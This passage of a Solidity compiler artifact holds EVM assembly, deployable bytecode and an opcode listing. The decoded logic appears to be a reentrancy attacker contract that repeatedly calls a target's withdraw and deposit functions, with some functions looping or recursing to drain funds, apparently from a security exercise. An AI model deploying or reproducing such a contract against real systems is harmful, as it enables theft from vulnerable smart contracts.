\"#utility.yul\":1566:1586   */\n      tag_114\n        /* \"#utility.yul\":1584:1585   */\n      dup4\n        /* \"#utility.yul\":1566:1586   */\n      tag_84\n      jump\t// in\n    tag_114:\n        /* \"#utility.yul\":1561:1586   */\n      swap3\n      pop\n        /* \"#utility.yul\":1605:1606   */\n      dup3\n        /* \"#utility.yul\":1602:1603   */\n      dup3\n        /* \"#utility.yul\":1599:1607   */\n      lt\n        /* \"#utility.yul\":1596:1630   */\n      iszero\n      tag_115\n      jumpi\n        /* \"#utility.yul\":1610:1628   */\n      tag_116\n      tag_90\n      jump\t// in\n    tag_116:\n        /* \"#utility.yul\":1596:1630   */\n    tag_115:\n        /* \"#utility.yul\":1655:1656   */\n      dup3\n        /* \"#utility.yul\":1652:1653   */\n      dup3\n        /* \"#utility.yul\":1648:1657   */\n      sub\n        /* \"#utility.yul\":1640:1657   */\n      swap1\n      pop\n        /* \"#utility.yul\":1472:1663   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1669:1767   */\n    tag_91:\n        /* \"#utility.yul\":1720:1726   */\n      0x00\n        /* \"#utility.yul\":1754:1759   */\n      dup2\n        /* \"#utility.yul\":1748:1760   */\n      mload\n        /* \"#utility.yul\":1738:1760   */\n      swap1\n      pop\n        /* \"#utility.yul\":1669:1767   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1773:1920   */\n    tag_92:\n        /* \"#utility.yul\":1874:1885   */\n      0x00\n        /* \"#utility.yul\":1911:1914   */\n      dup2\n        /* \"#utility.yul\":1896:1914   */\n      swap1\n      pop\n        /* \"#utility.yul\":1773:1920   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1926:2233   */\n    tag_93:\n        /* \"#utility.yul\":1994:1995   */\n      0x00\n        /* \"#utility.yul\":2004:2117   */\n    tag_120:\n        /* \"#utility.yul\":2018:2024   */\n      dup4\n        /* \"#utility.yul\":2015:2016   */\n      dup2\n        /* \"#utility.yul\":2012:2025   */\n      lt\n        /* \"#utility.yul\":2004:2117   */\n      iszero\n      tag_122\n      jumpi\n        /* \"#utility.yul\":2103:2104   */\n      dup1\n        /* \"#utility.yul\":2098:2101   */\n      dup3\n        /* \"#utility.yul\":2094:2105   */\n      add\n        /* \"#utility.yul\":2088:2106   */\n      mload\n        /* \"#utility.yul\":2084:2085   */\n      dup2\n        /* \"#utility.yul\":2079:2082   */\n      dup5\n        /* \"#utility.yul\":2075:2086   */\n      add\n        /* \"#utility.yul\":2068:2107   */\n      mstore\n        /* \"#utility.yul\":2040:2042   */\n      0x20\n        /* \"#utility.yul\":2037:2038   */\n      dup2\n        /* \"#utility.yul\":2033:2043   */\n      add\n        /* \"#utility.yul\":2028:2043   */\n      swap1\n      pop\n        /* \"#utility.yul\":2004:2117   */\n      jump(tag_120)\n    tag_122:\n        /* \"#utility.yul\":2135:2141   */\n      dup4\n        /* \"#utility.yul\":2132:2133   */\n      dup2\n        /* \"#utility.yul\":2129:2142   */\n      gt\n        /* \"#utility.yul\":2126:2227   */\n      iszero\n      tag_123\n      jumpi\n        /* \"#utility.yul\":2215:2216   */\n      0x00\n        /* \"#utility.yul\":2206:2212   */\n      dup5\n        /* \"#utility.yul\":2201:2204   */\n      dup5\n        /* \"#utility.yul\":2197:2213   */\n      add\n        /* \"#utility.yul\":2190:2217   */\n      mstore\n        /* \"#utility.yul\":2126:2227   */\n    tag_123:\n        /* \"#utility.yul\":1975:2233   */\n      pop\n        /* \"#utility.yul\":1926:2233   */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2239:2612   */\n    tag_94:\n        /* \"#utility.yul\":2343:2346   */\n      0x00\n        /* \"#utility.yul\":2371:2409   */\n      tag_125\n        /* \"#utility.yul\":2403:2408   */\n      dup3\n        /* \"#utility.yul\":2371:2409   */\n      tag_91\n      jump\t// in\n    tag_125:\n        /* \"#utility.yul\":2425:2513   */\n      tag_126\n        /* \"#utility.yul\":2506:2512   */\n      dup2\n        /* \"#utility.yul\":2501:2504   */\n      dup6\n        /* \"#utility.yul\":2425:2513   */\n      tag_92\n      jump\t// in\n    tag_126:\n        /* \"#utility.yul\":2418:2513   */\n      swap4\n      pop\n        /* \"#utility.yul\":2522:2574   */\n      tag_127\n        /* \"#utility.yul\":2567:2573   */\n      dup2\n        /* \"#utility.yul\":2562:2565   */\n      dup6\n        /* \"#utility.yul\":2555:2559   */\n      0x20\n        /* \"#utility.yul\":2548:2553   */\n      dup7\n        /* \"#utility.yul\":2544:2560   */\n      add\n        /* \"#utility.yul\":2522:2574   */\n      tag_93\n      jump\t// in\n    tag_127:\n        /* \"#utility.yul\":2599:2605   */\n      dup1\n        /* \"#utility.yul\":2594:2597   */\n      dup5\n        /* \"#utility.yul\":2590:2606   */\n      add\n        /* \"#utility.yul\":2583:2606   */\n      swap2\n      pop\n        /* \"#utility.yul\":2347:2612   */\n      pop\n        /* \"#utility.yul\":2239:2612   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2618:2889   */\n    tag_54:\n        /* \"#utility.yul\":2748:2751   */\n      0x00\n        /* \"#utility.yul\":2770:2863   */\n      tag_129\n        /* \"#utility.yul\":2859:2862   */\n      dup3\n        /* \"#utility.yul\":2850:2856   */\n      dup5\n        /* \"#utility.yul\":2770:2863   */\n      tag_94\n      jump\t// in\n    tag_129:\n        /* \"#utility.yul\":2763:2863   */\n      swap2\n      pop\n        /* \"#utility.yul\":2880:2883   */\n      dup2\n        /* \"#utility.yul\":2873:2883   */\n      swap1\n      pop\n        /* \"#utility.yul\":2618:2889   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa264697066735822122003df30efae25313ac72cd3c9d2eb99bd22ddb3132340e42d6218b619fbbe442a64736f6c634300080d0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "6080604052604051610a29380380610a29833981810160405281019061002591906100e0565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061010d565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061009b82610070565b9050919050565b60006100ad82610090565b9050919050565b6100bd816100a2565b81146100c857600080fd5b50565b6000815190506100da816100b4565b92915050565b6000602082840312156100f6576100f561006b565b5b6000610104848285016100cb565b91505092915050565b61090d8061011c6000396000f3fe6080604052600436106100735760003560e01c80632a26d5bd1161004e5780632a26d5bd146100bb57806382094433146100c55780639e5faafc146100cf578063c3eeda78146100d95761007a565b8062d87ec31461007c5780630a3115a71461008657806312065fe0146100905761007a565b3661007a57005b005b6100846100e3565b005b61008e61019d565b005b34801561009c57600080fd5b506100a5610228565b6040516100b29190610768565b60405180910390f35b6100c3610230565b005b6100cd6102c5565b005b6100d761047f565b005b6100e161059d565b005b6000600a90505b600081111561019a5760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d670de0b6b3a76400006040518263ffffffff1660e01b815260040161015491906107c8565b600060405180830381600087803b15801561016e57600080fd5b505af1158015610182573d6000803e3d6000fd5b505050506001816101939190610812565b90506100ea565b50565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561020d57600080fd5b505af1158015610221573d6000803e3d6000fd5b5050505050565b600047905090565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d670de0b6b3a76400006040518263ffffffff1660e01b815260040161029191906107c8565b600060405180830381600087803b1580156102ab57600080fd5b505af11580156102bf573d6000803e3d6000fd5b50505050565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166040516024016040516020818303038152906040527f791b8860000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505060405161038f91906108c0565b6000604051808303816000865af19150503d80600081146103cc576040519150601f19603f3d011682016040523d82523d6000602084013e6103d1565b606091505b505090505b801561047c5760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d670de0b6b3a76400006040518263ffffffff1660e01b815260040161043d91906107c8565b600060405180830381600087803b15801561045757600080fd5b505af115801561046b573d6000803e3d6000fd5b505050506104776102c5565b6103d6565b50565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b1580156104ef57600080fd5b505af1158015610503573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d670de0b6b3a76400006040518263ffffffff1660e01b815260040161056991906107c8565b600060405180830381600087803b15801561058357600080fd5b505af1158015610597573d6000803e3d6000fd5b50505050565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166040516024016040516020818303038152906040527f791b8860000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505060405161066791906108c0565b6000604051808303816000865af19150503d80600081146106a4576040519150601f19603f3d011682016040523d82523d6000602084013e6106a9565b606091505b505090505b801561074c5760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d670de0b6b3a76400006040518263ffffffff1660e01b815260040161071591906107c8565b600060405180830381600087803b15801561072f57600080fd5b505af1158015610743573d6000803e3d6000fd5b505050506106ae565b50565b6000819050919050565b6107628161074f565b82525050565b600060208201905061077d6000830184610759565b92915050565b6000819050919050565b6000819050919050565b60006107b26107ad6107a884610783565b61078d565b61074f565b9050919050565b6107c281610797565b82525050565b60006020820190506107dd60008301846107b9565b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600061081d8261074f565b91506108288361074f565b92508282101561083b5761083a6107e3565b5b828203905092915050565b600081519050919050565b600081905092915050565b60005b8381101561087a57808201518184015260208101905061085f565b83811115610889576000848401525b50505050565b600061089a82610846565b6108a48185610851565b93506108b481856020860161085c565b80840191505092915050565b60006108cc828461088f565b91508190509291505056fea264697066735822122003df30efae25313ac72cd3c9d2eb99bd22ddb3132340e42d6218b619fbbe442a64736f6c634300080d0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD PUSH2 0xA29 CODESIZE SUB DUP1 PUSH2 0xA29 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x25 SWAP2 SWAP1 PUSH2 0xE0 JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x10D JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x9B DUP3 PUSH2 0x70 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xAD DUP3 PUSH2 0x90 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xBD DUP2 PUSH2 0xA2 JUMP JUMPDEST DUP2 EQ PUSH2 0xC8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0xDA DUP2 PUSH2 0xB4 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xF6 JUMPI PUSH2 0xF5 PUSH2 0x6B JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x104 DUP5 DUP3 DUP6 ADD PUSH2 0xCB JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x90D DUP1 PUSH2 0x11C PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x73 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x2A26D5BD GT PUSH2 0x4E JUMPI DUP1 PUSH4 0x2A26D5BD EQ PUSH2 0xBB JUMPI DUP1 PUSH4 0x82094433 EQ PUSH2 0xC5 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0xCF JUMPI DUP1 PUSH4 0xC3EEDA78 EQ PUSH2 0xD9 JUMPI PUSH2 0x7A JUMP JUMPDEST DUP1 PUSH3 0xD87EC3 EQ PUSH2 0x7C JUMPI DUP1 PUSH4 0xA3115A7 EQ PUSH2 0x86 JUMPI DUP1 PUSH4 0x12065FE0 EQ PUSH2 0x90 JUMPI PUSH2 0x7A JUMP JUMPDEST CALLDATASIZE PUSH2 0x7A JUMPI STOP JUMPDEST STOP JUMPDEST PUSH2 0x84 PUSH2 0xE3 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x8E PUSH2 0x19D JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x9C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xA5 PUSH2 0x228 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xB2 SWAP2 SWAP1 PUSH2 0x768 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xC3 PUSH2 0x230 JUMP JUMPDEST STOP JUMPDEST PUSH2 0xCD PUSH2 0x2C5 JUMP JUMPDEST STOP JUMPDEST PUSH2 0xD7 PUSH2 0x47F JUMP JUMPDEST STOP JUMPDEST PUSH2 0xE1 PUSH2 0x59D JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH1 0xA SWAP1 POP JUMPDEST PUSH1 0x0 DUP2 GT ISZERO PUSH2 0x19A JUMPI PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x154 SWAP2 SWAP1 PUSH2 0x7C8 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x16E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x182 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x1 DUP2 PUSH2 0x193 SWAP2 SWAP1 PUSH2 0x812 JUMP JUMPDEST SWAP1 POP PUSH2 0xEA JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x20D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x221 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x291 SWAP2 SWAP1 PUSH2 0x7C8 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x2AB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x2BF JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0x791B886000000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD PUSH2 0x38F SWAP2 SWAP1 PUSH2 0x8C0 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x3CC JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x3D1 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP JUMPDEST DUP1 ISZERO PUSH2 0x47C JUMPI PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x43D SWAP2 SWAP1 PUSH2 0x7C8 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x457 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x46B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH2 0x477 PUSH2 0x2C5 JUMP JUMPDEST PUSH2 0x3D6 JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x4EF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x503 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x569 SWAP2 SWAP1 PUSH2 0x7C8 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x583 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x597 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0x791B886000000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD PUSH2 0x667 SWAP2 SWAP1 PUSH2 0x8C0 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x6A4 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x6A9 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP JUMPDEST DUP1 ISZERO PUSH2 0x74C JUMPI PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x715 SWAP2 SWAP1 PUSH2 0x7C8 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x72F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x743 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH2 0x6AE JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x762 DUP2 PUSH2 0x74F JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x77D PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x759 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x7B2 PUSH2 0x7AD PUSH2 0x7A8 DUP5 PUSH2 0x783 JUMP JUMPDEST PUSH2 0x78D JUMP JUMPDEST PUSH2 0x74F JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x7C2 DUP2 PUSH2 0x797 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x7DD PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x7B9 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x81D DUP3 PUSH2 0x74F JUMP JUMPDEST SWAP2 POP PUSH2 0x828 DUP4 PUSH2 0x74F JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x83B JUMPI PUSH2 0x83A PUSH2 0x7E3 JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x87A JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x85F JUMP JUMPDEST DUP4 DUP2 GT ISZERO PUSH2 0x889 JUMPI PUSH1 0x0 DUP5 DUP5 ADD MSTORE JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x89A DUP3 PUSH2 0x846 JUMP JUMPDEST PUSH2 0x8A4 DUP2 DUP6 PUSH2 0x851 JUMP JUMPDEST SWAP4 POP PUSH2 0x8B4 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x85C JUMP JUMPDEST DUP1 DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x8CC DUP3 DUP5 PUSH2 0x88F JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SUB 